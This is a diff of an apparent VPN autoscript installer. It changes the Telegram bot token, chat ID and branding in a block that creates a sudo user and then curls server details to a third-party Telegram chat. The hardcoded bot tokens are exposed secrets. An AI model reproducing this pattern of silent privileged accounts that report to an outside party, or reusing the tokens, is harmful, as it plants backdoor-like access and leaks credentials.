@@ -1037,8 +1037,8 @@ domain=$(cat /etc/xray/domain)
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID=""
-    KEY="6094210408:AAHx2ZMJ8PbcR4SjKvH1n-qDEGm0HoiAIWY"
+    CHATID="-1002069880009"
+    KEY="6945478503:AAG8XABz4xUBOBFfUu9HezoFaKJwFJSFHds"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     USRSC=$(curl https://raw.githubusercontent.com/Rstorenet/izinvps/ipuk/ip | grep $ipsaya | awk '{print $2}')
@@ -1047,7 +1047,7 @@ domain=$(cat /etc/xray/domain)
     TIMEZONE=$(printf '%(%H:%M:%S)T')
     TEXT="
 <code>────────────────────</code>
-<b>   AUTOSCRIPT DEVILS TUNNEL  </b>
+<b>   ❇️ AUTOSCRIPT PREMIUM ❇️ </b>
 <code>────────────────────</code>
 <code>User   : </code><code>$USRSC</code>
 <code>Domain : </code><code>$domain</code>
@@ -1058,7 +1058,7 @@ domain=$(cat /etc/xray/domain)
 <code>────────────────────</code>
 <i>Automatic Notification from</i>
 <i>Rstorenet</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/devilstunnels"},{"text":"GRUP🐬","url":"https://t.me/rizyulvpn"}]]}'
+"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/riyanstore_net"},{"text":"GRUP🐬","url":"https://t.me/riyanstore_net"}]]}'
    
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 
